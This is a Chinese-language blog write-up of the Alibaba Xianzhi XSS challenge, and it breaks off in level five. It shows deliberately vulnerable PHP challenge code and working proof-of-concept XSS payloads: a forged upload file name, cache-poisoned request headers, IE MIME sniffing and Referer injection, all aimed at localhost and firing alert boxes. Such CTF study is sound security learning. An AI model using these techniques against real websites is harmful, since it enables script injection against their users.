<!DOCTYPE html>
<html lang=zh-CN>
<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="google-site-verification" content="xBT4GhYoi5qRD5tr338pgPM5OWHHIDR6mNg1a3euekI" />
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta property="og:description" content="">
    <meta property="og:type" content="website">
    <meta name="description" content="">
    <meta name="keyword"  content="">
    <link rel="shortcut icon" href="/img/favicon.ico">

    <title>
        
        阿里先知xss挑战赛 Writeup - Seaii&#39;s Blog
        
    </title>

    <!-- Custom CSS -->
    
<link rel="stylesheet" href="/css/aircloud.css">

    
<link rel="stylesheet" href="/css/gitment.css">

    <!--<link rel="stylesheet" href="https://imsun.github.io/gitment/style/default.css">-->
    <link href="//at.alicdn.com/t/font_620856_28hi1hpxx24.css" rel="stylesheet" type="text/css">
    <!-- ga & ba script hoook -->
    <script></script>
<meta name="generator" content="Hexo 6.2.0"></head>

<body>

<div class="site-nav-toggle" id="site-nav-toggle">
    <button>
        <span class="btn-bar"></span>
        <span class="btn-bar"></span>
        <span class="btn-bar"></span>
    </button>
</div>

<div class="index-about">
    <i>  </i>
</div>

<div class="index-container">
    
    <div class="index-left">
        
<div class="nav" id="nav">
    <div class="avatar-name">
        <div class="avatar ">
            <img src="/img/avatar.jpeg" />
        </div>
        <div class="name">
            <i>seaii</i>
        </div>
    </div>
    <div class="contents" id="nav-content">
        <ul>
            <li >
                <a href="/">
                    <i class="iconfont icon-shouye1"></i>
                    <span>主页</span>
                </a>
            </li>
            <li >
                <a href="/tags">
                    <i class="iconfont icon-biaoqian1"></i>
                    <span>标签</span>
                </a>
            </li>
            <li >
                <a href="/archives">
                    <i class="iconfont icon-guidang2"></i>
                    <span>存档</span>
                </a>
            </li>
            <li >
                <a href="/collect/">
                    <i class="iconfont icon-shoucang1"></i>
                    <span>收藏</span>
                </a>
            </li>
            <li >
                <a href="/about/">
                    <i class="iconfont icon-guanyu2"></i>
                    <span>关于</span>
                </a>
            </li>
            
        </ul>
    </div>
    
        <div id="toc" class="toc-article">
    <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0"><span class="toc-text">1 文件上传</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-getallheaders"><span class="toc-text">2 getallheaders()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-json"><span class="toc-text">3 json</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-referer"><span class="toc-text">4 referer</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-%E8%B7%B3%E8%BD%AC"><span class="toc-text">5 跳转</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#6-%E5%BC%BA%E5%88%B6%E4%B8%8B%E8%BD%BD"><span class="toc-text">6 强制下载</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#7-text-x2F-plain"><span class="toc-text">7 text&#x2F;plain</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#8-%E6%A0%87%E7%AD%BE"><span class="toc-text">8 标签</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#9-plaintext%EF%BC%88-%EF%BC%89"><span class="toc-text">9 plaintext（***）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#10-MVM"><span class="toc-text">10 MVM</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#11-HOST"><span class="toc-text">11 HOST</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#13-REQUEST-URI"><span class="toc-text">13 REQUEST_URI</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#14-HIDDEN"><span class="toc-text">14 HIDDEN</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#15-Frame-Buster"><span class="toc-text">15 Frame Buster</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#16-PHP-SELF"><span class="toc-text">16 PHP_SELF</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#17-passive-element-%EF%BC%88-%EF%BC%89"><span class="toc-text">17 passive element （***）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#18-graduate-%EF%BC%88-%EF%BC%89"><span class="toc-text">18 graduate （***）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#19-Party"><span class="toc-text">19 Party</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#20-THE-END"><span class="toc-text">20 THE END</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%95%AA%E5%A4%96-jQuery-%EF%BC%88-%EF%BC%89"><span class="toc-text">番外 jQuery （***）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%86%99%E5%9C%A8%E6%9C%80%E5%90%8E"><span class="toc-text">写在最后</span></a></li></ol>
</div>
    
</div>


<div class="search-field" id="search-field">
    <div class="search-bg" id="search-bg"></div>
    <div class="search-container">
        <div class="search-input">
            <span id="esc-search"> <i class="icon-fanhui iconfont"></i></span>
            <input id="search-input"/>
            <span id="begin-search">搜索</span>
        </div>
        <div class="search-result-container" id="search-result-container">

        </div>
    </div>
</div>

        <div class="index-about-mobile">
            <i>  </i>
        </div>
    </div>
    
    <div class="index-middle">
        <!-- Main Content -->
        


<div class="post-container">
    <div class="post-title">
        阿里先知xss挑战赛 Writeup
    </div>

    <div class="post-meta">
        <span class="attr">发布于：<span>2017-09-10 23:21:00</span></span>
        
        <span class="attr">标签：/
        
        <a class="tag" href="/tags/#ctf" title="ctf">ctf</a>
        <span>/</span>
        
        <a class="tag" href="/tags/#xss" title="xss">xss</a>
        <span>/</span>
        
        
        </span>
        <span class="attr">访问：<span id="busuanzi_value_page_pv"></span>
</span>
</span>
    </div>
    <div class="post-content ">
        <p>前几天看到阿里先知有一个xss挑战赛，因为各种乱七八糟的事（主要是太菜了），一直没静下来好好研究一下。好在题目都提供了源码，又到了涨姿势的时间了~</p>
<span id="more"></span>


<h3 id="1-文件上传"><a href="#1-文件上传" class="headerlink" title="1 文件上传"></a>1 文件上传</h3><p>hint: HTML表单</p>
<p>代码比较多，这里只截取出现xss的点</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//各种检测</span></span><br><span class="line"><span class="comment">// Check if $uploadOk is set to 0 by an error</span></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$uploadOk</span> == <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Sorry, your file was not uploaded.&quot;</span>;</span><br><span class="line"><span class="comment">// if everything is ok, try to upload file</span></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;The file &quot;</span>. <span class="title function_ invoke__">basename</span>( <span class="variable">$_FILES</span>[<span class="string">&quot;fileToUpload&quot;</span>][<span class="string">&quot;name&quot;</span>]). <span class="string">&quot; has been uploaded.&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>很明显，出现xss的点是上传文件后直接将文件名输出了。</p>
<p>为了实现自动化攻击，我们需要构造html页面，诱导他人点开页面实现攻击。</p>
<p>这里有个很重要的点，我们不需要真正上传一个文件，可以<strong>通过构造表单的name值伪造文件上传</strong></p>
<p>正常上传是这样的：</p>
<p><img src="http://mdpicture.oss-cn-beijing.aliyuncs.com///170831/fE5k1BG2I4.png" alt="mark"></p>
<p>可以看到最下面设置了Content-Type</p>
<p>如果不设置Content-Type，构造一个形似文件上传的Content-Disposition，php的<code>$_FILES[&quot;fileToUpload&quot;][&quot;name&quot;]</code>依然可以接受到值。</p>
<p><img src="http://mdpicture.oss-cn-beijing.aliyuncs.com///170831/cK30geel06.png" alt="mark"></p>
<p>构造payload（只在IE11下测试通过，其他浏览器会将<code>&quot;</code>转义）：</p>
<p><img src="http://mdpicture.oss-cn-beijing.aliyuncs.com///170831/f5k93a8FiC.png" alt="mark"></p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">id</span>=<span class="string">&quot;xss&quot;</span> <span class="attr">action</span>=<span class="string">&quot;http://127.0.0.1/ali_xss_challenge/xss1.php&quot;</span> <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span> <span class="attr">enctype</span>=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span></span><br><span class="line">      	<span class="comment">&lt;!--使用&lt;input&gt;会将&quot;urlencode--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">textarea</span> <span class="attr">id</span>=<span class="string">&quot;t&quot;</span> <span class="attr">value</span>=<span class="string">&quot;test&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">textarea</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">var</span> t = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;t&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">        t.<span class="property">name</span> = <span class="string">&#x27;fileToUpload&quot;; filename=&quot;&lt;img src=1 onerror=alert(document.domain)&gt;.jpg&#x27;</span>; </span></span><br><span class="line"><span class="language-javascript">        <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;xss&#x27;</span>).<span class="title function_">submit</span>();</span></span><br><span class="line"><span class="language-javascript">    </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="2-getallheaders"><a href="#2-getallheaders" class="headerlink" title="2 getallheaders()"></a>2 getallheaders()</h3><p>hint:善用缓存</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&#x27;Pragma: cache&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Cache-Control: max-age=&quot;</span>.(<span class="number">60</span>*<span class="number">60</span>*<span class="number">24</span>*<span class="number">100</span>)); </span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;X-XSS-Protection: 0&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;&lt;meta charset=utf-<span class="number">8</span>&gt;&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_REFERER&#x27;</span>])) &#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;Bad Referrer!&quot;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">	<span class="keyword">foreach</span> (<span class="title function_ invoke__">getallheaders</span>() <span class="keyword">as</span> <span class="variable">$name</span> =&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line">    	<span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$name</span>: <span class="subst">$value</span>\n&quot;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<p>来看看题目设置的条件：</p>
<ol>
<li><p>设置了缓存</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&#x27;Pragma: cache&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Cache-Control: max-age=&quot;</span>.(<span class="number">60</span>*<span class="number">60</span>*<span class="number">24</span>*<span class="number">100</span>)); </span><br></pre></td></tr></table></figure>
</li>
<li><p>禁止使用referer</p>
</li>
<li><p>输出了其他所有的http头信息</p>
</li>
</ol>
<p>解决问题的思路似乎很明显了：如果第一次能够修改http头然后再进行跨域请求，第二次再请求一次的时候，浏览器不会再次请求服务端，而是直接读取本地缓存的内容，所以http的信息还是不会变的。</p>
<p>payload如下（Chrome）：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;referrer&quot;</span> <span class="attr">content</span>=<span class="string">&quot;never&quot;</span>&gt;</span> <span class="comment">&lt;!-- 跳转不带referer --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">var</span> request = <span class="keyword">new</span> <span class="title class_">Request</span>(<span class="string">&#x27;http://127.0.0.1/ali_xss_challenge/xss2.php&#x27;</span>, &#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="attr">method</span>: <span class="string">&#x27;GET&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">    <span class="attr">mode</span>: <span class="string">&#x27;no-cors&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">    <span class="attr">redirect</span>: <span class="string">&#x27;follow&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">    <span class="attr">headers</span>: <span class="keyword">new</span> <span class="title class_">Headers</span>(&#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;text/plain&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">        <span class="string">&#x27;Accept&#x27;</span>: <span class="string">&#x27;application/jsona&lt;img src=1 onerror=alert(document.domain)&gt;&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">    &#125;)</span></span><br><span class="line"><span class="language-javascript">&#125;);</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="title function_">fetch</span>(request).<span class="title function_">then</span>(<span class="keyword">function</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="number">1</span>);</span></span><br><span class="line"><span class="language-javascript">&#125;);</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">&quot;http://127.0.0.1/ali_xss_challenge/xss2.php&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>人长得丑又菜，就要多提问题。。。</p>
<ol>
<li><p>为什么不用ajax？</p>
<blockquote>
<p>基于CORS模型，浏览器发起的ajax请求分为简单跨域请求和非简单跨域请求。简单跨域请求不需要服务器允许便可发起，但浏览器会阻止响应。</p>
</blockquote>
<p>先来一篇科普 <a target="_blank" rel="noopener" href="http://www.ruanyifeng.com/blog/2016/04/cors.html">跨域资源共享 CORS 详解</a></p>
<p>也就是说，如果我们使用ajax的话，请求可以正常发送，但是无法获取服务端的响应，因为浏览器会拦截。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> xhr = <span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>();</span><br><span class="line">xhr.<span class="title function_">open</span>(<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;http://seaii-blog.com:8000&#x27;</span>);</span><br><span class="line">xhr.<span class="title function_">send</span>();</span><br><span class="line">xhr.<span class="property">onreadystatechange</span> = <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">if</span>(xhr.<span class="property">readyState</span> === <span class="number">4</span>) </span><br><span class="line">        <span class="keyword">if</span>(xhr.<span class="property">status</span> === <span class="number">200</span>) </span><br><span class="line">            <span class="keyword">if</span>(xhr.<span class="property">responseText</span>)</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(xhr.<span class="property">responseText</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>请求发出去了，但是得不到响应。</p>
<p><img src="http://mdpicture.oss-cn-beijing.aliyuncs.com///170903/gf2CHda9mh.png" alt="mark"></p>
<p><img src="http://mdpicture.oss-cn-beijing.aliyuncs.com///170903/eCi80AG2AF.png" alt="mark"></p>
<p>此时需要在服务端设置</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Access-Control-Allow-Origin:*&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>就可以正常获取响应。</p>
</li>
<li><p>payload中的Request对象是什么鬼？</p>
<p>除了贴链接和膜大神，还能说什么呢。。。</p>
<p><a target="_blank" rel="noopener" href="https://developer.mozilla.org/en-US/docs/Web/API/Request">https://developer.mozilla.org/en-US/docs/Web/API/Request</a></p>
</li>
</ol>
<h3 id="3-json"><a href="#3-json" class="headerlink" title="3 json"></a>3 json</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    json</span></span><br><span class="line"><span class="comment">    hint: MIME Sniffing</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-Type:application/json;charset=utf-8&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;X-XSS-Protection: 0&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&#123;&quot;errno&quot;:0,&quot;error&quot;:&quot;&quot;,&quot;data&quot;:&#123;&quot;user&quot;:&#123;&quot;id&quot;:&quot;2&quot;,&quot;user_name&quot;:&quot;\u4e13\u4e1a\u6295\u8d44\u4ebafh&quot;,&quot;email&quot;:&quot;&quot;,&quot;mobile&quot;:&quot;139****0002&quot;,&quot;intro&quot;:&quot;&#x27;</span>.<span class="variable">$_GET</span>[<span class="string">&quot;value&quot;</span>].<span class="string">&#x27;&quot;,&quot;address&quot;:null,&quot;photo&quot;:&quot;\/avatar\/000\/00\/00\/02virtual_avatar_big.jpg&quot;,&quot;user_uuid&quot;:&quot;779ab6bd7e2df90c37f1e892&quot;,&quot;header_url&quot;:&quot;\/avatar\/000\/00\/00\/02virtual_avatar_big.jpg&quot;,&quot;user_id&quot;:&quot;2&quot;,&quot;is_real_name&quot;:0,&quot;is_real_name_string&quot;:&quot;\u672a\u5b9e\u540d\u8ba4\u8bc1&quot;,&quot;real_name&quot;:&quot;\u5c24\u6654&quot;,&quot;is_investor&quot;:0,&quot;is_leader_investor&quot;:1,&quot;cetificate_id&quot;:&quot;511********4273&quot;,&quot;focus_area&quot;:[&quot;\u91d1\u878d:\u91c7\u8d2d\u7269\u6d41:\u80fd\u6e90\u73af\u4fdd:\u6cd5\u5f8b\u6559\u80b2:&quot;],&quot;third_party&quot;:[&#123;&quot;openid&quot;:&quot;1212&quot;,&quot;type&quot;:1,&quot;is_band&quot;:1&#125;,&#123;&quot;openid&quot;:&quot;2oiVL4wNxso9ttarGMIoVa1q-w8kU&quot;,&quot;type&quot;:1,&quot;is_band&quot;:1&#125;]&#125;&#125;&#125;&#x27;</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>问题主要出在<code>header(&quot;Content-Type:application/json;charset=utf-8&quot;);</code>，加上提示的<code>MIME Sniffing</code>，这是一道专门针对IE的题目，利用方法在这<a target="_blank" rel="noopener" href="http://www.91ri.org/16545.html">application&#x2F;json,application&#x2F;javascript等Response下进行XSS</a>。</p>
<p>预备知识：</p>
<blockquote>
<p>  <strong>MIME嗅探</strong>，或称为MIME类型检查。IE4之后浏览器都不会自动识别网络文件类型为服务器在HTTP头中标示的文件类型了，而且IE浏览器也不会通过Extension或是Signature来判断文件类型。取而代之的是，IE浏览器检查文件前256bytes中包含的字符来判断文件类型。这样除了用户直接访问图片URL下载文件时仍然有问题，但是在IE中通过IMG标签访问图片将不会搞错图片类型了。</p>
<p>  MIME嗅探最初只想防止服务器错误地标示content type。因为content type错误会导致攻击者绕开浏览器防自动执行下载文件的安全策略，特别是一些hta文件。MIME嗅探同时让浏览器对Content-Type有一定的容错性。<strong>如果服务器标示为text&#x2F;plain类型但提供了HTML文件，IE浏览器会将文件正确处理为HTML文件。</strong></p>
<p>  对于一般GIF，JPEG和PNG格式文件，浏览器只要检查到文件Extension，Content-Type以及Signature标示的类型一致时，将忽略MIME嗅探的结果。如果三种方法标示类型不一致，<strong>IE浏览器将使用MIME嗅探到的类型。</strong></p>
</blockquote>
<p>payload照着文章改就行了。</p>
<p><a target="_blank" rel="noopener" href="http://127.0.0.1/ali_xss_challenge/xss3.html">http://127.0.0.1/ali_xss_challenge/xss3.html</a></p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">&quot;http://127.0.0.1/redirect.php&quot;</span> <span class="attr">id</span>=<span class="string">&quot;x&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span></span><br><span class="line">    x.location.reload();</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><a target="_blank" rel="noopener" href="http://127.0.0.1/redirect.php">http://127.0.0.1/redirect.php</a></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;location: http://seaii-blog.com:8000/xss3.php?value=%3Cimg%20src=x%20onerror=alert(document.domain)%3E&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>修复方案：禁止ie进行MIME Sniffing</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&#x27;X-Content-Type-Options: nosniff&#x27;</span>);  </span><br></pre></td></tr></table></figure>

<h3 id="4-referer"><a href="#4-referer" class="headerlink" title="4 referer"></a>4 referer</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    referer</span></span><br><span class="line"><span class="comment">    hint:浏览器差异</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;X-XSS-Protection: 0&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta charset=<span class="string">&quot;utf-8&quot;</span>&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> <span class="string">&quot;你来自:&quot;</span>.<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_REFERER&#x27;</span>];<span class="meta">?&gt;</span></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<p>前面第二题的时候还在疑惑为什么要禁用referer，原来是单独有一个题在这等着。。。</p>
<p>先上一篇文章 <a target="_blank" rel="noopener" href="http://www.hackdig.com/?04/hack-9586.htm">http://www.hackdig.com/?04/hack-9586.htm</a></p>
<p>文中说ie8使用windows.location.href跳转，不会发送referer，但毕竟现在是2017年了，ie8坟头的草应该有两米高了，就不用在意了。。。</p>
<p>诱导访问受害者访问</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/ali_xss_challenge/xss4.html?a=&lt;img src=1 onerror=alert(1)&gt;</span><br></pre></td></tr></table></figure>

<p>内容如下：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">	<span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">href</span> = <span class="string">&#x27;http://127.0.0.1/ali_xss_challenge&#x27;</span> </span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>跳转的方法还有很多，不再多说了。这个方法在<strong>ie11</strong>上是可以使用的，但是机智的firefox、chrome会将query中的部分符号进行urlencode，也就不存在这种漏洞了（骚操作闪瞎眼）。</p>
<blockquote>
<p>Referrer不会被URL编码的现象，主要是在Windows7和Windows8.1 Win10的IE11以前也有，不过在打完Anniversary Update补丁之后，在对referrer的处理上做了一些改动，变成了会对referrer进行URL编码。</p>
</blockquote>
<p>还有一个flash的payload的，没研究过flash xss，就不贴了。</p>
<p>ps. 当跳转的两个网站协议不同时（http与https），只有<strong>https-&gt;http</strong>不会传送referer。</p>
<h3 id="5-跳转"><a href="#5-跳转" class="headerlink" title="5 跳转"></a>5 跳转</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    跳转</span></span><br><span class="line"><span class="comment">    hint: 停止跳转的方式有很多种</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;X-XSS-Protection: 0&quot;</span>);</span><br><span class="line"><span class="variable">$url</span> = <span class="title function_ invoke__">str_replace</span>(<span class="title function_ invoke__">urldecode</span>(<span class="string">&quot;%00&quot;</span>), <span class="string">&quot;&quot;</span>, <span class="variable">$_GET</span>[<span 